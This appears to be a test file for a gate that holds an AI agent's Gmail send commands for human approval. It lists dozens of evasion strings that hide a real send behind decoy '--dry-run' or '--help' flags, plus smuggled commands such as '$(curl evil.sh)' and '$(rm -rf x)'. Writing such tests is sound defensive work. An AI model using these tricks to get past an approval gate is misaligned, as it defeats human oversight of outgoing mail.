import { describe, test, expect } from 'bun:test';
import {
    evaluateEmailSend,
    envelopeFromJsonRaw,
    GWS_EMAIL_SEND_RE,
    EMAIL_BYPASS_FLAGS,
} from './email-gate-core';

// ── A3: pure evaluateEmailSend ──
// Ported verbatim from nanoclaw-v2 claude.ts:514-664. PURE: command + env
// snapshot in, verdict (+card content) out. No bun:sqlite, no fs, no I/O.
//
// NOTE on scheduled tasks: the verbatim source (claude.ts:617-619) BYPASSES
// the gate for scheduled tasks (`return {}` == allow). The lead's A3 brief
// asserted "isScheduledTask=true → gate", which inverts source. Flagged to the
// lead; implemented faithful-to-source pending confirmation. These tests assert
// the verbatim contract: scheduled → allow, interactive → gate.

const INTERACTIVE: { isScheduledTask: boolean } = { isScheduledTask: false };
const SCHEDULED: { isScheduledTask: boolean } = { isScheduledTask: true };

describe('evaluateEmailSend — gate decision', () => {
    test('test_email_send_interactive_gates', () => {
        const v = evaluateEmailSend(
            "gws gmail +send --to alice@example.com --subject 'Hi' --body 'hello'",
            INTERACTIVE,
        );
        expect(v.action).toBe('gate');
        expect(typeof v.label).toBe('string');
        expect(typeof v.summary).toBe('string');
        expect(v.label).toContain('alice@example.com');
        expect(v.label).toContain('Hi');
    });

    test('test_email_send_scheduled_bypasses', () => {
        // Verbatim source: scheduled tasks bypass → allow.
        const v = evaluateEmailSend(
            "gws gmail +send --to alice@example.com --subject 'Hi' --body 'hello'",
            SCHEDULED,
        );
        expect(v).toEqual({ action: 'allow' });
    });

    test('test_non_email_allows', () => {
        // Verbatim source (claude.ts:608) keys off GWS_EMAIL_SEND_RE, which is
        // NOT anchored to start-of-command. So a real send verb is required, but
        // `users drafts create` / `users messages list` (no `send` token) and
        // plain non-gws commands all miss the regex → allow.
        for (const cmd of [
            'ls -la',
            'git status',
            'gws gmail users messages list',
            'gws gmail users drafts create --to alice@example.com',
            '',
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
        }
    });

    test('matches the bare send verb anywhere (verbatim non-anchored RE)', () => {
        // Documenting verbatim behavior: GWS_EMAIL_SEND_RE is unanchored, so an
        // `echo`-wrapped send token still gates (accepted false-positive in
        // source; the egress proxy is the real boundary). NOT a bug — pins the
        // contract so a future "anchor it" change is a deliberate decision.
        expect(evaluateEmailSend('echo gws gmail +send', INTERACTIVE).action).toBe('gate');
    });

    test('test_email_send_dryrun_bypasses', () => {
        // Verbatim contract (claude.ts:613-615): --dry-run/--draft/--help/-h on
        // the gws segment bypass the gate → allow.
        for (const cmd of [
            'gws gmail +send --to a@b.com --dry-run',
            'gws gmail +send --to a@b.com --draft',
            'gws gmail +send --help',
            'gws gmail +send -h',
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
        }
    });

    test('bypass is scoped to the gws SEGMENT, not the whole command', () => {
        // Verbatim source (claude.ts:613-615) only honors a bypass flag in the
        // segment that contains the gws send. A --dry-run in a later piped
        // cleanup step must NOT suppress the gate for the real send.
        const v = evaluateEmailSend(
            'gws gmail +send --to victim@evil.com --subject S ; echo done --dry-run',
            INTERACTIVE,
        );
        expect(v.action).toBe('gate');
        expect(v.label).toContain('victim@evil.com');
    });

    test('--dry-run=false does NOT bypass (anchor regression)', () => {
        const v = evaluateEmailSend(
            'gws gmail +send --dry-run=false --to attacker@evil.com',
            INTERACTIVE,
        );
        expect(v.action).toBe('gate');
    });

    test('test_email_bypass_flag_in_quoted_content_does_NOT_bypass (QA codex-#2)', () => {
        // A --dry-run/-h/--draft INSIDE quoted email content (subject/body) must
        // NOT trip the bypass — the mail still sends, so it must GATE. Real argv
        // bypass tokens (above) still work.
        for (const cmd of [
            `gws gmail +send --to victim@evil.com --body "please --dry-run this report"`,
            `gws gmail +send --to victim@evil.com --subject "--help me" --body "hi"`,
            `gws gmail +send --to victim@evil.com --body 'send -h now'`,
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_command_substitution_fail_closed (QA codex re-pass #1)', () => {
        // A bypass flag inside $(...) / backticks / ${...} is stripped by bash
        // before gws runs (the mail still sends), so a token scan that trusted
        // it would be evaded. Any expansion syntax in the segment → do NOT
        // bypass → GATE.
        for (const cmd of [
            'gws gmail +send --to victim@evil.com --body hello $(printf %s --dry-run >/dev/null)',
            'gws gmail +send --to victim@evil.com --body hi `echo --dry-run`',
            'gws gmail +send --to victim@evil.com --body ${X:---dry-run}',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_quoted_command_substitution_fail_closed (codex #126 P1)', () => {
        // Command substitution inside DOUBLE / locale quotes still executes — bash
        // runs $(...) / backticks before the outer --dry-run/--help no-op. The
        // quote-span NUL-strip would hide it from the metachar check, so the
        // recognizer must inspect expanding-span content and fail closed. The mail
        // (the inner real send) goes out, so this must GATE.
        for (const cmd of [
            `gws gmail +send --to victim@evil.com --dry-run --body "$(gws gmail +send --to attacker@evil.com --body x)"`,
            'gws gmail +send --to victim@evil.com --help --subject "`gws gmail +send --to attacker@evil.com`"',
            `gws gmail +send --to victim@evil.com --dry-run --body "pre $(curl evil.sh) post"`,
            `gws gmail +send --to victim@evil.com --draft --body $"locale $(rm -rf x)"`,
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_quoted_param_expansion_still_bypasses (codex #126 P1 — no over-block)', () => {
        // Only command substitution executes. Bare parameter expansion in double
        // quotes ($VAR / ${VAR} / $5) substitutes a value without running a command,
        // so a legit dry-run/help/draft carrying one must STILL bypass.
        for (const cmd of [
            `gws gmail +send --to a@b.com --body "cost is $5 today" --dry-run`,
            `gws gmail +send --to a@b.com --body "hi ${'${USER}'}" --help`,
            `gws gmail +send --to a@b.com --subject "re: $TOPIC" --draft --body x`,
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
        }
    });

    test('test_email_bypass_redirection_fail_closed (QA codex re-pass #3)', () => {
        // A bypass flag after a redirection operator (<<< / < / > / 2>) is a
        // redirect operand / here-string content, not gws argv — bash strips it
        // before gws runs (the mail still sends). Any redirection metacharacter
        // in the unquoted structure → do NOT bypass → GATE.
        for (const cmd of [
            'gws gmail +send --to victim@evil.com --subject hi --body x <<< --dry-run',
            'gws gmail +send --to victim@evil.com --body x > --dry-run',
            'gws gmail +send --to victim@evil.com --body x 2> --dry-run',
            'gws gmail +send --to victim@evil.com --body x | tee --dry-run',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_legit_with_quoted_metachar_still_bypasses (no over-block)', () => {
        // A real --dry-run whose quoted subject/body merely CONTAINS a metachar
        // must still bypass — the metachar is inside quotes, not the structure.
        for (const cmd of [
            `gws gmail +send --to a@b.com --subject "a > b" --dry-run`,
            `gws gmail +send --to a@b.com --body "cost is $5" --help`,
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
        }
    });

    test('test_email_bypass_unbalanced_quotes_fail_closed (QA codex-#2)', () => {
        // Escaped/nested-quote evasion attempts that leave a stray quote after
        // stripping must fail CLOSED (gate), not bypass.
        const v = evaluateEmailSend(
            `gws gmail +send --to victim@evil.com --body "x\\" --dry-run \\""`,
            INTERACTIVE,
        );
        expect(v.action).toBe('gate');
    });

    test('test_email_bypass_comment_suffix_fail_closed (QA codex re-pass #4)', () => {
        // `… --body x # --dry-run` — bash drops everything from `#` on, so gws
        // sends WITHOUT --dry-run while the token is still textually present.
        // The `#` metacharacter must fail closed → GATE.
        for (const cmd of [
            'gws gmail +send --to victim@evil.com --subject hi --body x # --dry-run',
            'gws gmail +send --to victim@evil.com --body x #--help',
            'gws gmail +send --to victim@evil.com --body x # -h',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_fake_first_segment_fail_closed (QA codex re-pass #4)', () => {
        // A harmless fake send carrying the bypass flag, prefixed before the real
        // send, must NOT suppress the gate. Only checking the first matching
        // segment let the real (later) send slip through. Every send segment must
        // independently be a real-argv bypass; the real send isn't → GATE, with
        // the card built from the real recipient (not the fake).
        for (const cmd of [
            ': gws gmail +send --dry-run; gws gmail +send --to victim@evil.com --subject hi --body x',
            'gws gmail +send --to victim@evil.com --body x && gws gmail +send --dry-run',
            'echo gws gmail +send --dry-run | gws gmail +send --to victim@evil.com --body x',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_only_simple_single_command (chaining gates, codex #5)', () => {
        // Bypass is honored ONLY for a single simple send. Any chaining — even of
        // an otherwise-harmless dry-run — gates, because a separator is exactly
        // what a decoy attack needs and we cannot tell a benign follow-up from an
        // obfuscated second send. Fail-closed by design (the bypass is a
        // convenience for simple exploration, not a chained-pipeline feature).
        for (const cmd of [
            'gws gmail +send --dry-run --to a@b.com && echo done',
            'gws gmail +send --dry-run --to a@b.com; echo done',
            'echo start && gws gmail +send --dry-run --to a@b.com',
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE).action).toBe('gate');
        }
        // …but a plain single dry-run / help / draft send still bypasses.
        for (const cmd of [
            'gws gmail +send --dry-run --to a@b.com',
            'gws gmail +send --to a@b.com --help',
            'gws gmail +send --draft --to a@b.com --body x',
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
        }
    });

    test('test_email_bypass_obfuscated_verb_decoy_gates (QA codex re-pass #5)', () => {
        // Decoy dry-run + a real send whose verb is quote-spliced (`+se''nd` /
        // `+s""end`) so GWS_EMAIL_SEND_RE can't see it. The `;`/`|` separator
        // disqualifies the whole-command bypass, so the gate STILL fires — the
        // defense does NOT depend on parsing the obfuscated second command. This
        // is the security-critical property.
        for (const cmd of [
            `: gws gmail +send --dry-run; gws gmail +se''nd --to victim@evil.com --subject hi --body x`,
            `gws gmail +send --dry-run --to a@b.com | gws gmail +s""end --to victim@evil.com --body x`,
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE).action).toBe('gate');
        }
        // When the decoy carries no competing --to, the whole-command --to
        // fallback still surfaces the real recipient in the card (best-effort).
        const v = evaluateEmailSend(
            `: gws gmail +send --dry-run; gws gmail +se''nd --to victim@evil.com --subject hi --body x`,
            INTERACTIVE,
        );
        expect(v.label).toContain('victim@evil.com');
    });

    test('test_email_bypass_documented_overblocks_gate (QA codex re-pass #9, accepted fail-closed)', () => {
        // These are real dry-runs that bash WOULD run as dry-runs, but the
        // recognizer conservatively gates them. All are accepted fail-closed
        // false-positives (rare): absolute-path gws (matching bare `gws` avoids a
        // path-spoofing vector), quote-spliced / fully-quoted flags, a flag right
        // after a boolean option, and a non-consuming wrapper. Locked as
        // intentional so a future change that "fixes" them is a conscious choice.
        for (const cmd of [
            '/home/ubuntu/.npm-global/bin/gws gmail +send --to a@b.com --body x --dry-run', // abs path (codex #9)
            `gws gmail +send --dry'-'run --to a@b.com --body x`, // quote-spliced flag
            `gws gmail +send '--dry-run' --to a@b.com --body x`, // fully-quoted flag
            'command gws gmail +send --to a@b.com --body x --dry-run', // non-consuming wrapper
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE).action).toBe('gate');
        }
    });

    test('test_email_bypass_wrapper_prefix_fail_closed (QA codex re-pass #8, exec/env)', () => {
        // A wrapper builtin can swallow the bypass flag as argv0 / its own option
        // while gws still sends. `exec -a --dry-run gws …` makes --dry-run the
        // argv0 NAME, not a gws flag. The command must be a DIRECT gws invocation
        // (after VAR=value) — any other first word → GATE.
        for (const cmd of [
            'exec -a --dry-run gws gmail +send --to victim@evil.com --subject hi --body x',
            'env --dry-run=1 gws gmail +send --to victim@evil.com --body x',
            'time gws gmail +send --to victim@evil.com --body x --dry-run',
            'nice gws gmail +send --to victim@evil.com --body x --help',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_value_of_option_fail_closed (QA codex re-pass #8)', () => {
        // `--subject --dry-run` feeds --dry-run to --subject as its value, so gws
        // sends. Honor a bypass flag only when the preceding token is NOT a bare
        // value-consuming option → GATE here.
        for (const cmd of [
            'gws gmail +send --subject --dry-run --to victim@evil.com --body x',
            'gws gmail +send --body --dry-run --to victim@evil.com --subject hi',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_direct_gws_with_assignments_bypasses (no over-block, codex #8)', () => {
        // The REAL production form leads with the creds-file assignment; it must
        // still bypass. `--opt=val` is self-contained so a flag after it bypasses.
        for (const cmd of [
            'GOOGLE_WORKSPACE_CLI_CREDENTIALS_FILE=/home/node/.config/gws/accounts/x.json gws gmail +send --to a@b.com --body z --dry-run',
            'gws gmail +send --subject=hi --dry-run --to a@b.com',
            'gws gmail +send --to a@b.com --body x --dry-run',
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
        }
    });

    test('test_email_bypass_adjacent_quote_concatenation_fail_closed (QA codex re-pass #7)', () => {
        // bash CONCATENATES adjacent quoted+unquoted fragments into ONE word:
        // `--body 'x'--dry-run` → the word `x--dry-run` (no real flag → mail
        // sends). A space-replacement would split them and manufacture a bogus
        // --dry-run token; the sentinel keeps them one token ≠ flag → GATE.
        for (const cmd of [
            `gws gmail +send --to victim@evil.com --subject hi --body 'x'--dry-run`,
            `gws gmail +send --to victim@evil.com --subject hi --body "x"--dry-run`,
            `gws gmail +send --to victim@evil.com --body $'x'--dry-run`,
            `gws gmail +send --to victim@evil.com --body z --dry-r'X'un`,
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_escaped_whitespace_fail_closed (QA codex re-pass #6, backslash)', () => {
        // `--body \ --dry-run` — bash treats `\ ` as an escaped (literal) space
        // joined into the body value, so gws gets body=" --dry-run" and NO real
        // --dry-run flag (it sends). A naive \s split would manufacture a
        // --dry-run token from the space after the backslash. Any unquoted
        // backslash → fail closed → GATE.
        for (const cmd of [
            'gws gmail +send --to victim@evil.com --subject hi --body \\ --dry-run',
            'gws gmail +send --to victim@evil.com --body x\\ --dry-run',
            'gws gmail +send --to victim@evil.com --body x\\\t--dry-run',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_non_ifs_whitespace_fail_closed (QA codex re-pass #6, form-feed)', () => {
        // Form-feed / vertical-tab are JS \s but NOT bash IFS — bash keeps
        // `x\f--dry-run` as ONE word (body value, it sends), so splitting tokens
        // on bash IFS only (not \s) keeps them as one token ≠ --dry-run → GATE.
        for (const cmd of [
            'gws gmail +send --to victim@evil.com --body x\f--dry-run',
            'gws gmail +send --to victim@evil.com --body x\v--dry-run',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_newline_decoy_gates (QA codex re-pass #5, newline separator)', () => {
        // A decoy --dry-run on line 1 and a real send on line 2. The newline is a
        // command separator: `\s+` token-splitting would otherwise treat it as
        // whitespace and read the decoy's --dry-run as a real argv token while
        // bash runs the second line and sends. `\n`/`\r` are in the metachar set
        // so the whole-command bypass fails closed → GATE.
        for (const cmd of [
            'gws gmail +send --dry-run\ngws gmail +send --to victim@evil.com --body x',
            'gws gmail +send --to victim@evil.com --body x\r\ntrue --dry-run',
        ]) {
            const v = evaluateEmailSend(cmd, INTERACTIVE);
            expect(v.action).toBe('gate');
            expect(v.label).toContain('victim@evil.com');
        }
    });

    test('test_email_bypass_quoted_separator_in_body_still_bypasses (over-block fix, codex #5)', () => {
        // A real --dry-run whose subject/body quotes a shell separator must still
        // bypass — the quoted span is stripped before the metacharacter test, so
        // the `;`/`|`/`&` inside it never trips fail-closed.
        for (const cmd of [
            `gws gmail +send --to a@b.com --body "a;b" --dry-run`,
            `gws gmail +send --to a@b.com --subject "x|y & z" --help`,
            `gws gmail +send --to a@b.com --body 'one && two' --draft`,
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
        }
    });

    test('test_email_bypass_ansi_c_quoting_still_bypasses (QA codex re-pass #4, finding 3)', () => {
        // A real --dry-run whose body uses bash ANSI-C `$'…'` or locale `$"…"`
        // quoting must still bypass — the leading `$` belongs to a stripped quoted
        // span, not a live expansion.
        for (const cmd of [
            `gws gmail +send --to a@b.com --body $'cost is $5' --dry-run`,
            `gws gmail +send --to a@b.com --body $"localized" --help`,
        ]) {
            expect(evaluateEmailSend(cmd, INTERACTIVE)).toEqual({ action: 'allow' });
        }
    });

    test('test_email_send_in_command_substitution_gates (QA codex re-pass #4)', () => {
        // A send hidden inside $(…) lives in a segment whose `$`/`(` fail the
        // metacharacter check, so that segment is a non-bypassed send → GATE.
        const v = evaluateEmailSend(
            'echo $(gws gmail +send --to victim@evil.com --body x) ; gws gmail +send --dry-run',
            INTERACTIVE,
        );
        expect(v.action).toBe('gate');
        expect(v.label).toContain('victim@evil.com');
    });

    test('raw API send form gates', () => {
        const v = evaluateEmailSend(
            'gws gmail users messages send --to bob@example.com',
            INTERACTIVE,
        );
        expect(v.action).toBe('gate');
        expect(v.label).toContain('bob@example.com');
    });
});

describe('evaluateEmailSend — account parsed from command, not env', () => {
    test('test_account_from_command_not_env', () => {
        const v = evaluateEmailSend(
            'GOOGLE_WORKSPACE_CLI_CREDENTIALS_FILE=/home/node/.config/gws/accounts/work-bo.json gws gmail +send --to a@b.com --subject S',
            INTERACTIVE,
        );
        expect(v.action).toBe('gate');
        // Account slug comes from the creds path in the COMMAND.
        expect(v.summary).toContain('*From:* work-bo');
    });

    test('defaults to "default" when no creds path in command', () => {
        const v = evaluateEmailSend('gws gmail +send --to a@b.com', INTERACTIVE);
        expect(v.action).toBe('gate');
        expect(v.summary).toContain('*From:* default');
    });

    test('env snapshot does not carry the account', () => {
        // The EnvSnapshot interface has no account field; the account is derived
        // purely from the command string. Same command + same env → same verdict.
        const cmd =
            'GOOGLE_WORKSPACE_CLI_CREDENTIALS_FILE=/home/node/.config/gws/accounts/personal.json gws gmail +send --to a@b.com';
        const a = evaluateEmailSend(cmd, INTERACTIVE);
        const b = evaluateEmailSend(cmd, INTERACTIVE);
        expect(a).toEqual(b);
        expect(a.summary).toContain('*From:* personal');
    });
});

describe('envelopeFromJsonRaw (raw-API envelope decode)', () => {
    test('decodes base64url RFC 822 to/subject', () => {
        const rfc822 = 'To: carol@example.com\r\nSubject: Quarterly\r\n\r\nbody here';
        const b64url = Buffer.from(rfc822, 'utf-8')
            .toString('base64')
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=+$/, '');
        const seg = `gws gmail users messages send --json '{"raw":"${b64url}"}'`;
        const env = envelopeFromJsonRaw(seg);
        expect(env.to).toBe('carol@example.com');
        expect(env.subject).toBe('Quarterly');
    });

    test('returns {} on malformed json', () => {
        expect(envelopeFromJsonRaw("--json '{not json}'")).toEqual({});
        expect(envelopeFromJsonRaw('no json flag here')).toEqual({});
    });

    test('raw-API send surfaces decoded recipient in the card', () => {
        const rfc822 = 'To: dave@example.com\r\nSubject: Decoded\r\n\r\nhi';
        const b64url = Buffer.from(rfc822, 'utf-8')
            .toString('base64')
            .replace(/\+/g, '-')
            .replace(/\//g, '_')
            .replace(/=+$/, '');
        const v = evaluateEmailSend(
            `gws gmail users messages send --json '{"raw":"${b64url}"}'`,
            INTERACTIVE,
        );
        expect(v.action).toBe('gate');
        expect(v.label).toContain('dave@example.com');
        expect(v.label).toContain('Decoded');
    });
});

describe('purity — no I/O imports', () => {
    test('module imports no bun:sqlite / fs (statement-level, comments allowed)', async () => {
        const src = await Bun.file(
            new URL('./email-gate-core.ts', import.meta.url),
        ).text();
        // Strip line + block comments so the explanatory prose ("no bun:sqlite")
        // doesn't trip the check — only real import/require statements count.
        const code = src
            .replace(/\/\*[\s\S]*?\*\//g, '')
            .replace(/^[ \t]*\/\/.*$/gm, '');
        expect(code).not.toMatch(/import[\s\S]*?['"]bun:sqlite['"]/);
        expect(code).not.toMatch(/require\(\s*['"]bun:sqlite['"]\s*\)/);
        expect(code).not.toMatch(/import[\s\S]*?['"](?:node:)?fs['"]/);
        expect(code).not.toMatch(/require\(\s*['"](?:node:)?fs['"]\s*\)/);
        // No staging/delivery I/O symbols invoked (dynamic import strings either).
        expect(code).not.toContain('writeMessageOut');
        expect(code).not.toContain('awaitDeliveryAck');
        expect(code).not.toContain('messages-out');
        expect(code).not.toContain('delivery-acks');
    });

    test('exported send-detection regex + bypass-flag set match the source', () => {
        expect(GWS_EMAIL_SEND_RE.source).toBe(
            '\\bgws\\s+gmail\\s+(?:\\+(?:send|reply|reply-all|forward)|users\\s+(?:messages|drafts)\\s+send)\\b',
        );
        // The bypass flags are token-matched (not regex-over-raw-segment) so
        // quoted content can't trip them — pin the canonical set.
        expect([...EMAIL_BYPASS_FLAGS].sort()).toEqual(['--draft', '--dry-run', '--help', '-h']);
    });
});
